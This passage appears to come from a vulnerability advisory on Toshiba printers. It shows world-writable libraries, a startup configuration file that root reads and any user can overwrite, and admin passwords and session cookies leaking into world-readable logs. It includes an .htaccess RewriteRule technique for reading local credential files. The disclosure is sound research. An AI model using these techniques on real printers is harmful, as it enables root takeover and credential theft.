</ul>
<p>The permissions of these libraries are insecure. A remote attacker can overwrite them and achieve Remote Code Execution:</p>
<pre><font color=red>-rwxrwxrwx 1 root root 322261 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libciindexeddb.so.0
-rwxrwxrwx 1 root root 343680 Dec  6 01:48 /home/SYSROM_SRC/build/release/lib/libsyscallerr.so.0
-rwxrwxrwx 1 root root 566991 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcios.so.0
-rwxrwxrwx 1 root root 139986 Sep 19  2019 /mfp/lib/libatawrapper.so.0.0
-rwxrwxrwx 1 root root 38330 May 28  2019 /mfp/lib/libmfpcommonwrapper.so.0.0
-rwxrwxrwx 1 apache messagebus 2765203 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/lib/libcrypto.so.1.0.0
-rwxrwxrwx 1 root root 9479623 Apr 25  2014 /mfp/lib/libsvml.so
-rwxrwxrwx 1 root root 95211 Dec  6 02:00 /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
-rwxrwxrwx 1 root root 744984 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6
-rwxrwxrwx 1 root root 48131 Apr  8  2019 /mfp/lib/libcpanel.so.0.0
-rwxrwxrwx 1 root root 58976 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
-rwxrwxrwx 1 root root 744984 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6
-rwxrwxrwx 1 root root 58976 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
-rwxrwxrwx 1 root root 127850 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcissmclient.so.0
-rwxrwxrwx 1 root root 14101772 Dec  6 01:40 /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
-rwxrwxrwx 1 root root 909064 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcihdb.so.0
-rwxrwxrwx 1 root root 269392 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
-rwxrwxrwx 1 apache messagebus 485480 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
-rwxrwxrwx 1 root   root       251701 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libgssapi.so.2.0.0
-rwxrwxrwx 1 root root 539700 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
-rwxrwxrwx 1 root root 624082 Dec  6 04:53 /home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0
-rwxrwxrwx 1 root root 624082 Apr 20  2018 /home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0.0.0
-rwxrwxrwx 1 root root 60708 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/lib/liblber-2.4.so.2.5.6
-rwxrwxrwx 1 root root 324233 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
-rwxrwxrwx 1 root root 525228 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
-rwxrwxrwx 1 root root 225346 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
-rwxrwxrwx 1 root root 759349 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
-rwxrwxrwx 1 root root 166289 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
-rwxrwxrwx 1 root root 14571 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
-rwxrwxrwx 1 root root 92942 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
-rwxrwxrwx 1 root root 24134 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libheimntlm.so.0.1.0
</font></pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The libraries (more than hundreds) used by these programs can be replaced by malicious libraries by any local or remote attacker.</p>
<p><a id="lpe-rce-cissm"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using CISSM</h2>
<p>It was observed that the <code>cissm</code> program runs as root inside the printers. This Toshiba-specific program will start children processes as shown below, based on the content of the <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code> XML file stored in the printer:</p>
<pre><code>bash-4.1# ps auxw | grep cissm
root      1487  0.0  0.3  53496 10184 ?        Sl   16:34   0:02 ./cissm -T 7 -d ssm.xml
bash-4.1# pstree
[...]
     |-cissm-+-alAddressBookMg
     |       |-alCloning
     |       |-alExportImport
     |       |-alLogRetriever
     |       |-alLogmanager---{alLogmanager}
     |       |-alPanelStartLED---{alPanelStartLE}
     |       |-alPanelUIMessag---{alPanelUIMessa}
     |       |-alServiceUIPlug
     |       |-alUiFrameWork---24*[{alUiFrameWork}]
     |       |-alViewPlugin---3*[{alViewPlugin}]
     |       |-alaccountmgr---2*[{alaccountmgr}]
     |       |-alappmanager-+-2*[python---5*[{python}]]
     |       |              `-15*[{alappmanager}]
     |       |-alboserver---7*[{alboserver}]
     |       |-alcbamanager---26*[{alcbamanager}]
     |       |-aldevauthmgmtpl
     |       |-aldeviceconfigp
     |       |-aldeviceservice---{aldeviceservic}
     |       |-aleFilingmgr
     |       |-alfilestoragem
     |       |-algrpmgr
     |       |-alhddalertmgr
     |       |-alhddbackuprest
     |       |-alhomedatamgr
     |       |-alifaxreceive
     |       |-alintegritychkm
     |       |-aljobcontroller---8*[{aljobcontrolle}]
[...]
</code></pre>
<p>The XML configuration file used by cissm is located at <code>/home/SYSROM_SRC/build/thirdparty/bin/ssm.xml</code> and has insecure permissions:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/ssm.xml /home/SYSROM_SRC/build/thirdparty/bin/ssm.xml /home/SYSROM_SRC/build/common/bin/ssm.xml
-rwxrwxrwx 1 root root 55245 Oct  7  2021 /home/SYSROM_SRC/build/common/bin/ssm.xml
lrwxrwxrwx 1 root root    28 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/ssm.xml -&gt; ../../thirdparty/bin/ssm.xml
lrwxrwxrwx 1 root root    24 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/ssm.xml -&gt; ../../common/bin/ssm.xmlroot
</code></pre>
<p>This file is used to run program as root when the printer starts and can be used to redefine any program running as root when the printer boots. This program also runs every 3 minute.</p>
<p>An attacker can remotely write an additional entry to start a malicious command that will be executed as root when the printer boots:</p>
<p>Content of <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code>:</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;SSM xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../../../LayerInterface/CI/ServiceStartupManager/SSM.xsd"&gt;
    &lt;!-- Start: CI Layer services --&gt;
    &lt;Service&gt;
        &lt;name&gt;cischeduler&lt;/name&gt;
        &lt;group/&gt;
        &lt;exePath&gt;./cischeduler&lt;/exePath&gt;
        &lt;startupType&gt;Automatic&lt;/startupType&gt;
        &lt;enabled&gt;1&lt;/enabled&gt;
        &lt;ProcessGroup&gt;TRUSTED&lt;/ProcessGroup&gt;
        &lt;StartParameters&gt;
            &lt;Param&gt;-S&lt;/Param&gt;
            &lt;Param&gt;ramdisk&lt;/Param&gt;
            &lt;Param&gt;&amp;gt;&lt;/Param&gt;
            &lt;Param&gt;/work/log/ci/cischeduler.log&lt;/Param&gt;
        &lt;/StartParameters&gt;      
    &lt;/Service&gt;
    &lt;Service&gt;
        &lt;name&gt;cipollproc&lt;/name&gt;
        &lt;group/&gt;
        &lt;exePath&gt;./cipollproc&lt;/exePath&gt;
        &lt;startupType&gt;Automatic&lt;/startupType&gt;
        &lt;enabled&gt;1&lt;/enabled&gt;
        &lt;ProcessGroup&gt;TRUSTED&lt;/ProcessGroup&gt;
        &lt;StartParameters&gt;
            &lt;Param&gt;&amp;gt;&lt;/Param&gt;
            &lt;Param&gt;/work/log/ci/cipollproc.log&lt;/Param&gt;
        &lt;/StartParameters&gt;
        &lt;StartupCondition&gt;
            &lt;Condition&gt;
                &lt;Service name="cischeduler" state="Ready"&gt;&lt;/Service&gt;
            &lt;/Condition&gt;
        &lt;/StartupCondition&gt;
    &lt;/Service&gt;
    [...]
</code></pre>
<p>Analysis of <code>pspy32</code> running on the printer:</p>
<pre>
2023/05/27 20:32:43 CMD: UID=0     PID=4228   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:43 CMD: UID=0     PID=4229   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:46 CMD: UID=0     PID=4230   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:46 CMD: UID=0     PID=4231   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:50 CMD: UID=0     PID=4232   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:50 CMD: UID=0     PID=4233   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:53 CMD: UID=0     PID=4234   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:53 CMD: UID=0     PID=4235   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:56 CMD: UID=0     PID=4236   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
<font color=red>2023/05/27 20:32:56 CMD: UID=0     PID=4237   | ./cissm -T 7 -d ssm.xml</font>
2023/05/27 20:32:56 CMD: UID=0     PID=4238   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
[...]
<font color=red>2023/05/27 20:35:26 CMD: UID=0     PID=4393   | ./cissm -T 7 -d ssm.xml</font>
[...]
<font color=red>2023/05/27 20:37:56 CMD: UID=0     PID=4532   | ./cissm -T 7 -d ssm.xml</font>
[...]
<font color=red>2023/05/27 20:39:56 CMD: UID=0     PID=4676   | ./cissm -T 7 -d ssm.xml</font>
[...]
2023/05/27 20:42:19 CMD: UID=0     PID=4831   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:19 CMD: UID=0     PID=4832   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:22 CMD: UID=0     PID=4833   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:22 CMD: UID=0     PID=4834   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:25 CMD: UID=0     PID=4835   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:25 CMD: UID=0     PID=4836   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
<font color=red>2023/05/27 20:42:26 CMD: UID=0     PID=4837   | ./cissm -T 7 -d ssm.xml</font>
2023/05/27 20:42:27 CMD: UID=0     PID=4839   | sh -c ps -eo stat,comm | grep -e "^Z.*agent" -e "^Z.*ebx_dl" -e "^Z.*de_ipfax" 
2023/05/27 20:42:27 CMD: UID=0     PID=4838   | sh -c ps -eo stat,comm | grep -e "^Z.*agent" -e "^Z.*ebx_dl" -e "^Z.*de_ipfax" 
2023/05/27 20:42:29 CMD: UID=0     PID=4840   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:29 CMD: UID=0     PID=4841   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:32 CMD: UID=0     PID=4842   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:32 CMD: UID=0     PID=4843   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
[...]
</pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code> configuration file can be replaced by any local or remote attacker to run any malicious program as root when the printer starts.</p>
<p>Attackers can backdoor the printer.</p>
<p><a id="passwords-logs"></a></p>
<h2>Details - Passwords stored in clear-text logs and insecure logs</h2>
<p>It was observed that passwords are stored in clear-text logs.</p>
<p>Some logs are stored inside the <code>/ramdisk/work/log/al</code> directory with insecure permissions, allowing any local attacker to read and modify these files:</p>
<pre><code>bash-4.1# ls -laR /ramdisk/work/log/al/*
-rw-rw-rw- 1 root trusted  42678 May 23 16:10 /ramdisk/work/log/al/accounting.log.0.txt
-rw-rw-rw- 1 root trusted   2228 May 23 15:14 /ramdisk/work/log/al/address.log.0.txt
-rw-rw-rw- 1 root trusted   6877 May 23 15:16 /ramdisk/work/log/al/alPanelStartLEDHandler.log.0.txt
-rw-rw-rw- 1 root trusted  23536 May 23 16:10 /ramdisk/work/log/al/alPanelUIMessageHandler.log.0.txt
-rw-rw-rw- 1 root trusted     79 May 23 15:14 /ramdisk/work/log/al/albluetooth.log.0.txt
-rw-rw-rw- 1 root trusted    449 May 23 15:14 /ramdisk/work/log/al/alcloning.log.0.txt
-rw-rw-rw- 1 root trusted   1594 May 23 15:14 /ramdisk/work/log/al/alcloudclient.log.0.txt
-rw-rw-rw- 1 root trusted    987 May 23 15:14 /ramdisk/work/log/al/aldevauthmgmtplugin.log.0.txt
-rw-rw-rw- 1 root trusted 307378 May 23 16:11 /ramdisk/work/log/al/aldeviceconfig.log.0.txt
-rw-rw-rw- 1 root trusted  29171 May 23 15:16 /ramdisk/work/log/al/aldeviceservice.log.0.txt
-rw-rw-rw- 1 root trusted    128 May 23 15:15 /ramdisk/work/log/al/aleSCL.log.0.txt
-rw-rw-rw- 1 root trusted    474 May 23 15:14 /ramdisk/work/log/al/alexportimport.log.0.txt
-rw-rw-rw- 1 root trusted   1437 May 23 15:14 /ramdisk/work/log/al/alfilestoragem.log.0.txt
-rw-rw-rw- 1 root trusted  13465 May 23 16:11 /ramdisk/work/log/al/allicensemgmt.log.0.txt
-rw-rw-rw- 1 root trusted   5380 May 23 15:14 /ramdisk/work/log/al/almaintenanceplugin.log.0.txt
-rw-rw-rw- 1 root trusted    111 May 23 15:14 /ramdisk/work/log/al/alnfcplugin.log.0.txt
-rw-rw-rw- 1 root trusted   4432 May 23 16:05 /ramdisk/work/log/al/alulm.log.0.txt
-rw-rw-rw- 1 root trusted    682 May 23 15:14 /ramdisk/work/log/al/alvnclauncher.log.0.txt
-rw-rw-rw- 1 root trusted  67235 May 23 16:08 /ramdisk/work/log/al/appmanager.log.0.txt
-rw-rw-rw- 1 root trusted  31306 May 23 16:11 /ramdisk/work/log/al/authplugin.log.0.txt
-rw-rw-rw- 1 root trusted    590 May 23 15:15 /ramdisk/work/log/al/bonjour.log.0.txt
-rw-rw-rw- 1 root trusted 147834 May 23 16:15 /ramdisk/work/log/al/boserver.log.0.txt
-rwxrwxrwx 1 root trusted 250542 May 23 16:14 /ramdisk/work/log/al/boserverEvent.log.28.txt
-rw-rw-rw- 1 root trusted   1110 May 23 15:14 /ramdisk/work/log/al/cbamanager.log.0.txt
-rw-rw-rw- 1 root trusted     98 May 23 15:14 /ramdisk/work/log/al/eBRlog.log.0.txt
-rw-rw-rw- 1 root trusted   3311 May 23 15:15 /ramdisk/work/log/al/efile.log.0.txt
-rwxrwxrwx 1 root trusted    567 May 23 16:10 /ramdisk/work/log/al/grpmgrplugin.log.0.txt
-rw-rw-rw- 1 root trusted   2277 May 23 16:10 /ramdisk/work/log/al/hdm.log.0.txt
-rw-rw-rw- 1 root trusted    206 May 23 15:15 /ramdisk/work/log/al/ifaxrx.log.0.txt
-rw-rw-rw- 1 root trusted   1037 May 23 15:14 /ramdisk/work/log/al/jobcontroller.log.0.txt
-rw-rw-rw- 1 root trusted   4714 May 23 15:41 /ramdisk/work/log/al/jtm.log.0.txt
-rw-rw-rw- 1 root trusted    610 May 23 15:15 /ramdisk/work/log/al/logmanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted 286932 May 23 15:23 /ramdisk/work/log/al/logretriever.log.0.txt
-rw-rw-rw- 1 root trusted    214 May 23 15:15 /ramdisk/work/log/al/network-ipv6.log.0.txt
-rw-rw-rw- 1 root trusted  22498 May 23 15:16 /ramdisk/work/log/al/nsm.log.0.txt
-rw-rw-rw- 1 root trusted 169537 May 23 16:01 /ramdisk/work/log/al/panel.log.0.txt
-rw-rw-rw- 1 root trusted   3403 May 23 15:15 /ramdisk/work/log/al/printmanager.log.0.txt
-rw-rw-rw- 1 root trusted  26623 May 23 16:10 /ramdisk/work/log/al/prm.log.0.txt
-rw-rw-rw- 1 root trusted   1264 May 23 15:15 /ramdisk/work/log/al/remoteApplication.log.0.txt
-rw-rw-rw- 1 root trusted 565116 May 23 16:11 /ramdisk/work/log/al/renderer.log.2.txt
-rw-rw-rw- 1 root trusted   2434 May 23 15:14 /ramdisk/work/log/al/reportmanager.log.0.txt
-rw-rw-rw- 1 root trusted    426 May 23 15:14 /ramdisk/work/log/al/reportmsgr.log.0.txt
-rw-rw-rw- 1 root trusted  20834 May 23 16:11 /ramdisk/work/log/al/restrictionmode.log.0.txt
-rw-rw-rw- 1 root trusted    732 May 23 16:10 /ramdisk/work/log/al/rolemanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted  12464 May 23 16:11 /ramdisk/work/log/al/securitysettingsplugin.log.0.txt
-rw-rw-rw- 1 root trusted  19963 May 23 15:15 /ramdisk/work/log/al/sharedprint.log.0.txt
-rw-rw-rw- 1 root trusted    159 May 23 15:15 /ramdisk/work/log/al/slp.log.0.txt
-rw-rw-rw- 1 root trusted    798 May 23 15:15 /ramdisk/work/log/al/snmpd.log.0.txt
-rw-rw-rw- 1 root trusted  12287 May 23 15:15 /ramdisk/work/log/al/stage2.log.0.txt
-rw-rw-rw- 1 root trusted   5955 May 23 15:15 /ramdisk/work/log/al/swupdate.log.0.txt
-rw-rw-rw- 1 root trusted   2306 May 23 15:14 /ramdisk/work/log/al/usb.log.0.txt
-rw-rw-rw- 1 root trusted   1113 May 23 15:15 /ramdisk/work/log/al/usbprn.log.0.txt
-rw-rw-rw- 1 root trusted  14238 May 23 16:10 /ramdisk/work/log/al/usermanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted   2553 May 23 15:14 /ramdisk/work/log/al/viewplugin.log.0.txt

/ramdisk/work/log/al/epfx:
total 28
drwxrwxrwx 4 root   trusted     0 May 23 15:14 .
drwxrwxrwx 5 root   trusted     0 May 23 16:10 ..
-rwxrwxrwx 1 root   trusted 28010 May 23 16:08 eprocessframework.log.0.txt
drwxrwxrwx 2 apache trusted     0 May 23 15:14 httpd_worker_1711
drwxrwxrwx 2 apache trusted     0 May 23 15:14 httpd_worker_1712

/ramdisk/work/log/al/wsp:
total 4
drwxrwxrwx 2 root trusted    0 May 23 15:15 .
drwxrwxrwx 5 root trusted    0 May 23 16:10 ..
-rw-rw-rw- 1 root trusted 3600 May 23 16:14 alwsprint.log.0.txt

/ramdisk/work/log/al/wsscn:
total 4
drwxrwxrwx 2 root trusted    0 May 23 15:15 .
drwxrwxrwx 5 root trusted    0 May 23 16:10 ..
-rw-rw-rw- 1 root trusted 1083 May 23 15:15 alwswsc.log.0.txt
bash-4.1#
</code></pre>
<p><a id="passwords-logs-01"></a></p>
<h3>Clear-text password written in logs when an user logs into the printer</h3>
<p>When a user logs into the TopAccess web interface, the password will be written in logs that are world-readable as shown below.</p>
<p>Login as admin with the password <code>PASSWORD-SECRET-PIERRE</code>, we can see the password saved into 2 log files that are world-readable:</p>
<ul>
<li><code>/ramdisk/work/log/al/boserverEvent.log.*.txt</code></li>
<li><code>/ramdisk/al/network/log/http.log</code></li>
</ul>
<p>Leak of credentials inside the log files:</p>
<pre><code>bash-4.1# grep -ri PIER .
./work/log/al/boserverEvent.log.28.txt:&lt;Evt&gt;&lt;t&gt;05/27 16:18:39443877&lt;/t&gt;&lt;Set&gt;&lt;sID&gt;ContentWebServer_10.0.0.2.fda0f003cf95b852233893df36d9b1ff&lt;/sID&gt;&lt;pID&gt;8556&lt;/pID&gt;&lt;pName&gt;httpd&lt;/pName&gt;&lt;SetValue&gt;&lt;Payload XMLPayLoad = "true" overrideDelta = "true"&gt;&lt;path&gt;&lt;/path&gt;&lt;value&gt;&lt;Authentication&gt;&lt;UserCredential&gt;&lt;userName&gt;admin&lt;/userName&gt;&lt;passwd&gt;PASSWORD-SECRET-PIERRE&lt;/passwd&gt;&lt;ipaddress&gt;10.0.0.2&lt;/ipaddress&gt;&lt;DepartmentManagement isEnable="false"&gt;&lt;requireDepartment/&gt;&lt;/DepartmentManagement&gt;&lt;domainName/&gt;&lt;applicationType&gt;TOP_ACCESS&lt;/applicationType&gt;&lt;/UserCredential&gt;&lt;/Authentication&gt;&lt;/value&gt;&lt;/Payload&gt;&lt;/SetValue&gt;&lt;/Set&gt;&lt;/Evt&gt;
./al/network/log/http.log:[Fri May 27 16:18:39.519454 2023] [contentwebserver:debug] [pid 8556] ccontentwebserver.cpp(4175): [client 10.0.0.2:41700] PASSWORD-SECRET-PIERRE, referer: http://10.0.0.1:8080/TopAccessLogin.html?v=1670282309ta
</code></pre>
<p>These files have insecure permissions allowing any user to retrieve the passwords and to modify the logs.</p>
<p>The files can be also modified by a remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<pre>
bash-4.1# ls -la /ramdisk/al/network/log/http.log
ls -la /ramdisk/al/network/log/http.log
<font color=red>-rw-rw-rw-</font> 1 root trusted 663910 May 27 16:20 /ramdisk/al/network/log/http.log
bash-4.1# ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 715841 May 27 16:20 /ramdisk/work/log/al/boserverEvent.log.28.txt
bash-4.1#
</pre>

<p><a id="passwords-logs-02"></a></p>
<h3>Clear-text password written in logs when a password is modified</h3>
<p>Using the TopAccess web interface, it is possible to update passwords of users.</p>
<p><img alt="" src="images/2024-toshiba-users-password-logs.png" /></p>
<p>Such password will be found in the log files (<code>NEW-PASSWORD-PIERRE</code>):</p>
<pre><code>bash-4.1# grep -r NEW-PASSWORD-PIERRE .
./work/log/al/boserverEvent.log.28.txt:&lt;Evt&gt;&lt;t&gt;05/27 16:22:22933938&lt;/t&gt;&lt;Set&gt;&lt;sID&gt;ContentWebServer_10.0.0.2.63e5f73ea1d7ecf9cfd935393adb8b11&lt;/sID&gt;&lt;pID&gt;4974&lt;/pID&gt;&lt;pName&gt;httpd&lt;/pName&gt;&lt;SetValue&gt;&lt;Payload XMLPayLoad = "true" overrideDelta = "true"&gt;&lt;path&gt;&lt;/path&gt;&lt;value&gt;&lt;UserManager&gt;&lt;View&gt;&lt;UpdateUser&gt;&lt;User ID="10002"&gt;&lt;Information&gt;&lt;passwd&gt;NEW-PASSWORD-PIERRE&lt;/passwd&gt;&lt;UserSoftKeyboardDisplay&gt;true&lt;/UserSoftKeyboardDisplay&gt;&lt;/Information&gt;&lt;/User&gt;&lt;/UpdateUser&gt;&lt;/View&gt;&lt;/UserManager&gt;&lt;/value&gt;&lt;/Payload&gt;&lt;/SetValue&gt;&lt;/Set&gt;&lt;/Evt&gt;
bash-4.1#
</code></pre>
<p>And this log file also has insecure permissions, allowing any user to retrieve the passwords or to modify the log file.</p>
<p>The files can be also modified by a remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<pre>
bash-4.1# ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 886685 May 27 16:23 /ramdisk/work/log/al/boserverEvent.log.28.txt
bash-4.1#
</pre>

<p>An attacker can retrieve passwords.</p>
<p>An attacker can modify the logs.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="sessions-logs-01"></a></p>
<h2>Details - Leak of authentication sessions in insecure logs in /ramdisk/work/log directory</h2>
<p>It was observed that the session cookies, used for authentication, are stored in clear-text logs. These logs are world-readable and some can also be freely modified by any local attacker.</p>
<p>Some logs are stored inside the <code>/ramdisk/work/log</code> directory with insecure permissions. We can find the authentication sessions (e.g. <code>ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e</code>) inside.</p>
<p>Leak of sessions inside the log files:</p>
<pre><code>bash-4.1# pwd
/work/log
bash-4.1# grep -r '10.0.0.2\.' *
[...]
./log/al/boserverEvent.log.26.txt:&lt;Evt&gt;&lt;t&gt;05/30 15:50:21222835&lt;/t&gt;&lt;Session "timerReset"&gt;&lt;id&gt;ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e&lt;/id&gt;&lt;num&gt;658&lt;/num&gt;&lt;pID&gt;2670&lt;/pID&gt;&lt;pName&gt;alappmanager&lt;/pName&gt;&lt;newTimerValue&gt;0&lt;/newTimerValue&gt;&lt;/Session&gt;&lt;/Evt&gt;
./log/al/boserver.log.0.txt:05/30 15:50:05535294 Pid= 1657,Tid= 1784,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'GetSettings' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:05552743 Pid= 1657,Tid= 1783,cborepository.cpp: 4816:WRN:DELIVERCMD: Delegating Command 'LicenseEnableCheck' from 'httpd' to Plugin 'LicenseMgmt-0x9f' with SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:05556758 Pid= 1657,Tid= 1785,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'LicenseEnableCheck' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:14741108 Pid= 1657,Tid= 1784,cborepository.cpp: 4816:WRN:DELIVERCMD: Delegating Command 'LicenseEnableCheck' from 'httpd' to Plugin 'LicenseMgmt-0x9f' with SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
